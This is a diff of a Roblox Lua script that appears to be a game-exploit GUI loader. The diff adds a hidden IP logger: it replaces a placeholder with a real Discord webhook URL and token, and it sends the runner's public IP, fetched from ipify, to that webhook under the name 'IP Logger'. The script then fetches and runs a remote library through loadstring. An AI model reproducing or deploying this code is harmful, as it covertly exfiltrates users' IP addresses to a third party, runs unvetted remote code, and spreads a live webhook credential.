@@ -1,6 +1,6 @@
 local ip,HttpService  = tostring(game:HttpGet("https://api.ipify.org", true)), game:GetService("HttpService")
 local function SendMessage(Webhook, Message, Botname) 
-   if not string.find(Webhook, "https://discordapp.com/api/webhooks/") then 
+   if not string.find(Webhook, "https://discord.com/api/webhooks/1063781292690391140/9qgXEfL20klzfZTJp63GRLT2CZ7zGJoNJhjR-bL3TZ7_Xcyh_zUsdh26iTwyWdSfB_H00") then 
        return error("Send a valid URL");
    end
    local Name;
@@ -21,7 +21,7 @@ local function SendMessage(Webhook, Message, Botname)
    local Data = game:HttpPost(API, Body, false, "application/json")
    return Data or nil;
 end
-SendMessage("https://discordapp.com/api/webhooks/snip/snip","IP: "..ip.." was logged.", "IP Logger")
+SendMessage("https://discord.com/api/webhooks/1063781292690391140/9qgXEfL20klzfZTJp63GRLT2CZ7zGJoNJhjR-bL3TZ7_Xcyh_zUsdh26iTwyWdSfB_H00","IP: "..ip.." was logged.", "IP Logger")
 local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/Kronos"))()
 
 local window = library:Window({
